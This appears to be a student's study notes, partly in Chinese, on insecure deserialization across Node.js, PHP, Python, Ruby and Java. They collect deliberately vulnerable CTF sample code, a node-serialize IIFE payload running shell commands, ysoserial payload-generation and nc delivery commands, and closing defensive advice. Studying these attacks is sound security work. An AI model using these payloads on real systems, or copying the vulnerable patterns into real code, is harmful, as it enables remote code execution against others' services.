
Magic methods @ python
http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html

Deserialization of untrusted data - OWASP
https://www.owasp.org/index.php/Deserialization_of_untrusted_data

Deserialization Cheat Sheet - OWASP
https://www.owasp.org/index.php/Deserialization_Cheat_Sheet


Serialization and Deserialization what and why

Serialization and Deserialization: working principle

insecure Serialization and Deserialization:

Harden

attack and defense

======================================================
https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
======================================================
android-serialization-vulnerabilities
https://www.rsaconference.com/writable/presentations/file_upload/mbs-f03-android-serialization-vulnerabilities-revisited.pdf

======================================================
Exploiting Node.js deserialization bug for Remote Code Execution
https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/

node-serialize. A cookie value that comes from the request was passed into the unserialize() function provided by the module. 
Here is a sample node.js application to imitate the code


漏洞程式
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) {
     res.send("Hello " + escape(obj.username));
   }
 } else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6ImFqaW4iLCJjb3VudHJ5IjoiaW5kaWEiLCJjaXR5IjoiYmFuZ2Fsb3JlIn0=", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("Hello World");
});
app.listen(3000);



漏洞程式分析
var serialize = require('node-serialize');

建構攻擊碼
The best way to create a payload is to use the serialize() function of the same module.

I created the following JavaScript object and passed it to serialize() function.


var y = {
 rce : function(){
 require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
 },
}

var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));



Now we have a serialized string that can be deserialized with unserialize() function. 
But the problem is code execution won’t happen until you trigger the function corresponding to the rce property of the object.

Later I figured out that we can use JavaScript’s Immediately invoked function expression (IIFE) for calling the function. 
If we use IIFE bracket ()after the function body, the function will get invoked when the object is created. 
It works similar to a Class constructor in C++.

Now the serialize() function with the modified object code is called.

var y = {
rce : function(){
require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });
}(),
}
var serialize = require('node-serialize');
console.log("Serialized: \n" + serialize.serialize(y));

攻擊漏洞
nodejsshell.py


https://www.blackhat.com/docs/us-17/thursday/us-17-Munoz-Friday-The-13th-JSON-Attacks-wp.pdf
Java Deserialization and .NET BinaryFormatter deserialization are known to be vulnerable to deserialization
attacks since they invoke deserialization callbacks during the process. The whole attack boils down to be able to control
an object type in the deserialized object graph which has a deserialization callback whose logic could be subverted to
run arbitrary code.
JSON deserialization, in general, lacks the concept of deserialization callbacks which may lead to a false sense of
security: these formats being secure to deal with untrusted data. 
To prove this hypothesis wrong, let's review how
deserialization libraries normally work.


======================================================

PHPSerialization and Deserialization
http://www.phpinternalsbook.com/classes_objects/serialization.html

PHP unserialization vulnerabilities: What are we missing?
https://www.slideshare.net/_s_n_t/php-unserialization-vulnerabilities-what-are-we-missing

物件生命週期lifecycle
Understanding PHP objects - SlideShare
https://www.slideshare.net/jpauli/understanding-php-objects

Life Cycle of an Object in PHP and Object Caching
Object-Oriented Programming with PHP5
By Hasin Hayder
December 2007
Learn to leverage PHP5's OOP features to write manageable applications with ease

PHP7 開發之道
https://imyoungyang.gitbooks.io/php7-study-group-notes/content/Chapter2/php-magic-methods.html

PHP 目前有15個 magic methods，依照功能大致分類如下：
Categories	Magic Methods
Stringification (物件字串輸出輸入)	__toString, __set_state, __debugInfo
Lifecycle (物件生命週期)	__construct, __destruct
Property Overloading (屬性覆寫)	__set, __get, __isset, __unset
Method Overloading (方法覆寫)	__call, __callStatic
Serialization (序列化)	__sleep, __wakeup
Cloning (複製)	__clone
Object Invocation (物件呼叫)	__invoke

-------------------------------------
<?php

class MyFirstCTF {
    protected $test = "CTF";
    function __wakeup()
    {
        print "Wake up yo!<br>";
        system("echo ".$this->test);
    }
}

$input = $_GET['str'];
$kb = unserialize($input);

highlight_file(__FILE__);

------------------------------------
物件導向PHP
http://php.net/manual/en/language.oop5.magic.php

Magic Methods 
The function names __construct(), __destruct(), __call(), __callStatic(), __get(), __set(), __isset(),
__unset(), __sleep(), __wakeup(), __toString(), __invoke(), __set_state(), __clone() and __debugInfo() 
are magical in PHP classes. 
You cannot have functions with these names in any of your classes unless you want the magic functionality associated with them.

PHP highlight_file() 函数:http://www.w3school.com.cn/php/func_misc_highlight_file.asp
PHP highlight_file() Function - W3Schools
https://www.w3schools.com/php/func_misc_highlight_file.asp

9個Magic constants: __LINE__ 
http://php.net/manual/zh/language.constants.predefined.php

========================================================================
Python Serialization and Deserialization
http://spootnik.org/entries/2014/04/05/diving-into-the-python-pickle-formatt/index.html


OWASP AppSecCali 2015 - Marshalling Pickles
https://www.slideshare.net/frohoff1/appseccali-2015-marshalling-pickles
P:83有測試網址


python -m pickletools <file.pickle>

-------------------------------------
WheRe iS yOur gg?
<?php

$gg = $_POST['data'];
if (isset($gg)) {
        preg_match('/^[a-zA-Z0-9=]+$/', $gg, $m);
        system("echo $m[0] | python pickle.py");
} else {
        echo "WheRe iS yOur gg?<br>";
}
highlight_file(__FILE__);


preg_match:限制你的

解題步驟::
[1]先看看原始碼ip:port/pickle.py

[2]測看看是否有漏洞??

ip:port

[3]建造payload進行攻擊

hackbar 
post->送payload
要url encode

-------------------------------------
Ruby Serialization and Deserialization

https://docs.ruby-lang.org/en/2.4.0/Marshal.html

Ruby Marshalling from A to Z
https://ilyabylich.svbtle.com/ruby-marshalling-from-a-to-z

Marshalling is a serialization process when you convert an object to a binary string.
Ruby has a standard class Marshal that does all the job for serialization and deserialization.
To serialize an object, use Marshal.dump, 
to deserialize - Marshal.load or Marshal.restore.

marshalled = Marshal.dump([1, 2, 'string', Object.new])
# => "\x04\b[\ti\x06i\aI\"\vstring\x06:\x06ETo:\vObject\x00"

Marshal.load(marshalled)
# => [1, 2, "string", #<Object:0x00000002643000>]



https://github.com/OWASP/railsgoat/wiki/Extras:-Remote-Code-Execution

Rails 動態樣板路徑的風險 By  Shaolin on 2015-07-24


RubyGems.org | Ruby 社群Gem 套件管理平台
RubyGems is a package management framework for Ruby.

https://rubygems.org/?locale=zh-TW
RubyGems.org 是Ruby 社群的Gem 套件管理服務，讓你能立即地發佈及安裝你的Gem 套件，並且利用API 查詢及操作可用Gem 的詳細資訊。

分發Ruby程序和函式庫的標準格式「gem」
https://github.com/rubygems/rubygems
似於Python的pip（英語：Pip (package manager)
RubyGems大約創建於2003年11月，從Ruby 1.9版起成為Ruby標準庫的一部分

http://guides.rubygems.org/rubygems-basics/

安裝devise套件：gem install devise
安裝devise套件還指定要裝哪個版本的套件:gem install devise -v='1.1.8'
套件砍掉：gem uninstall devise


CVE-2017-0903
Unsafe Object Deserialization Vulnerability in RubyGems
https://blog.rubygems.org/2017/10/09/unsafe-object-deserialization-vulnerability.html


YAML, like Marshal, is meant to serialize and deserialize arbitrary Ruby objects. 
When RubyGems.org processes a Gem upload, it reads the Gem specification, which in turn reads the checksums in the Gem. 
A clever attacker could write a checksum file to a Gem that contains YAML formatted in such a way 
as to inject an arbitrary Ruby object and use that object as an escalation point.


 CVE-2018-1000074 rubygems: Unsafe Object Deserialization Vulnerability in gem 
 owner allowing arbitrary code execution on specially crafted YAML
--------------------------------------------------------

#!/usr/bin/ruby
class Kaibro
    def initialize name
        @name = name
    end

    def name
        @name
    end
end

c = gets("*").strip
t = Marshal.load(c)
puts `#{t.name}`

-------------------------------------

產生payload===序列化字串
使用檔案來存序列化字串(unreadable)

cat payload - | nc IP port

-------------------------------------
 Java deserialization vulnerability


[1]Java-Deserialization-Cheat-Sheet
https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet


[2]Java Deserialization Attacks: Angriff &	Verteidigung
https://www.owasp.org/images/7/71/GOD16-Deserialization.pdf

Tools:
• Use	commercial	or	free	scanners	like	ZAP/Burp	
–with	plugins	such	as	SuperSerial	to	passively	scan	for	Java	serializaPon	
• Also	think	of	mass	scanning	of	server	endpoints	with	scripts	like	
SerializeKiller		
• Use WireShark	for	network	traffic	
• If	allowed	to	instrument	the	app	use	runPme	agents	such	as	SWAT	to	find	
out	if	anything	gets	deserialized

[3]軍火庫 vs  漏洞掃描
ysoserial
A proof-of-concept tool for generating payloads that exploit unsafe Java object deserialization.
https://github.com/frohoff/ysoserial

unsafe deserialization of objects

JAVA

java -jar ysoserial.jar


java -jar ysoserial.jar CommonsCollections1 calc.exe | xxd

$ java -jar ysoserial.jar Groovy1 calc.exe > groovypayload.bin
$ nc 10.10.10.10 1099 < groovypayload.bin

$ java -cp ysoserial.jar ysoserial.exploit.RMIRegistryExploit myhost 1099 CommonsCollections1 calc.exe


https://blog.netspi.com/java-deserialization-attacks-burp/
[1]產生Payload
java -jar ./ysoserial-0.0.4-all.jar CommonsCollections1 ‘ping netspi.com’ > payload
[2]載入到Burp進行攻擊
copy the serialized output into Burp using the paste from file context menu item

 Burp extension Java Serial Killer to perform the serialization for me. 
 It essentially is a modified Repeater tab that uses the payload generation from ysoserial.
 
 https://github.com/NetSPI/JavaSerialKiller

Java-Deserialization-Cheat-Sheet: info on vulnerabilities, tools, blogs/write-ups, etc.
marshalsec: similar project for various Java deserialization formats/libraries
ysoserial.net: similar project for .NET deserialization

[4][防禦手法]Wayout:?
DO	NOT	DESERIALIZE	UNTRUSTED	DATA!!	
When	architecture	permits	it:		
– Use	other	formats	instead	of	serialized	objects:	JSON,	XML,	etc.		
• But	be	aware	of	XML-based	deserialization	attacks	via	XStream,	XmlDecoder,	etc.	

As	second-best	option:	
Use	defensive	deserialization	with	look-ahead	OIS	with	a strict	whitelist		
• Don’t	rely	on	gadget-blacklisting	alone!
• You	can	build	the	whitelist	with	OpenSource	agent	SWAT
(	Serial	Whitelist	Application	Trainer:	https://github.com/cschneider4711/SWAT	)	
• Consider	an	agent-based	instrumenting	of	ObjectInputStream	(to	catch	them	all)	
• Scan	your	own	whitelisted	code	for	potential	gadgets
• Still	be	aware	of	DoS	scenarios


java.io.ObjectInputStream class is used to deserialize objects. 
It's possible to harden its behavior by subclassing it. 
However, if you don't own the code or can't wait for a patch, 
using an agent to weave in hardening to java.io.ObjectInputStream is the best solution.

To enable these agents, simply add a new JVM parameter:

-javaagent:name-of-agent.jar


[5][防禦與再攻擊]Attack and defense? bypassing the security 


Exploiting Java Deserialization Vulnerabilities (RCE) on JSF/Seam ...
https://www.youtube.com/watch?v=VaLSYzEWgVE

Exploiting Deserialization Vulnerabilities in Java
https://www.slideshare.net/codewhitesec/exploiting-deserialization-vulnerabilities-in-java-54707478

Java Deserialization Vulnerabilities - The Forgotten Bug Class (DeepSec Edition)
https://www.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class-deepsec-edition

Defending against Java Deserialization Vulnerabilities
https://www.slideshare.net/ikkisoft/defending-against-java-deserialization-vulnerabilities


https://www.synopsys.com/content/dam/synopsys/sig-assets/whitepapers/exploiting-the-java-deserialization-vulnerability.pdf

java - Malicious object injection with xstream - Stack Overflow

A Deserialization Attack relies on feeding serialized, malicious data (Shellcode, commands, database records, etc.) 
into a listening service which deserializes the data it receives. 
If the attack is successful, the sent malicious code could cause a Denial of Service, a Bypassed Authentication Control 
or even Remote Code Execution. 
Because (de)serialization is such a broadly used technology, there are countless vulnerabilities, covering all Operating Systems, 
many Applications and many Programming Languages such as C, C++, Python, and Ruby.
